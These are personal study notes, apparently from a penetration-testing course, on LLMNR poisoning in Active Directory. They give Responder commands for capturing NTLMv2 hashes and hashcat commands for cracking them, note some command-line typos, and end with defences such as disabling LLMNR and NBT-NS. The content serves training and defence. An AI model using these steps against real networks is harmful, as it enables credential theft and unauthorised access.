#cybersecurity #hacking #penetration-testing 
#active-directory #man-in-the-middle 

# LLMNR Poisoning

## What is LLMNR (link-local multicast name resolution)?
- used to identify hosts when DNS fails to do so
- previously NBT-NS
- key flaw is that the service utilizes a user's username and NTLMv2 hash when appropriately responded to

## # LLMNR Poisoning Overview
- LLMNR Poisoning is a man-in-the-middle attack 
![](https://i.imgur.com/CIJBzc7.png)

## Steps
1. run responder ```python Responder.py -| tun0 -rdw```
2. an event occurs
3. get NTLMv2 hashes
4. crack the hash ```hashcat -m 5600 hashes.txt. rockyou.txt```

## Capturing NTLMv2 Hashes with Responder

Setup responder listening from attack machine (kali)

This didn't work for me:
```bash
responder -I eth0 -rdw
```

Kept getting a message ```error: no such option: -r```

This worked:
```bash
responder -I eth0 -dwP
```

### Responder issues update from PNPT Staff
```
Responder is missing -r

The new version of responder has had the -r switch removed, to install the old version ( one used with the course )

New command line is : 

responder -I eth0 -dw

Or....

Update: Added to Pimpmykali rev 1.4.7 
Menu option R

Does the following: 
wget http://old.kali.org/kali/pool/main/r/responder/responder_3.0.6.0-0kali2_all.deb

sudo apt update

sudo apt -y remove responder 

sudo dpkg -i responder_3.0.6.0-0kali2_all.deb

sudo apt-mark hold responder

This will download the old responder, uninstall the current responder version, install the old responder verion 3.0.6.0 and you can use the old command line in the course material
```

Then try to connect to the attack machine from one of the victim machines (Vegeta)
The Hash Dump is produced from the responder:

![](https://i.imgur.com/Ytmgzbr.png)

## Password Cracking with Hashcat
#hash-cracking

- I ran this thru with my M1 Max, shit was fast! ```brew install hashcat```
- crack the hash ```hashcat -m 5600 hashes.txt. rockyou.txt```

![](https://imgur.com/4pzyFt5.png](https://imgur.com/4pzyFt5.png)

### Where to Find Wordlists?
- https://github.com/danielmiessler/SecLists
- https://github.com/initstring/passphrase-wordlist

## LLMNR Poisoning Defense

The best defense in this case is to disable LLMNR and NBT-NS.
- To disable LLMNR, select "Turn OFF Multicast Name Resolution" under Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client in the Group Policy Editor.
- To disable NBT-NS, navigate to Network Connections > Network Adapter Properties > TCP/IPv4 Properties > ﻿﻿Advanced tab > WINS tab and select "Disable NetBIOS over TCP/IP"

If a company must use or cannot disable LLMNR/NBT-NS, the best course of action is to:
-   ﻿﻿Require Network Access Control
-   ﻿﻿Require strong user passwords (e.g., >14 characters in length and limit common word usage). The more complex and long the password, the harder it is for an attacker to crack the hash.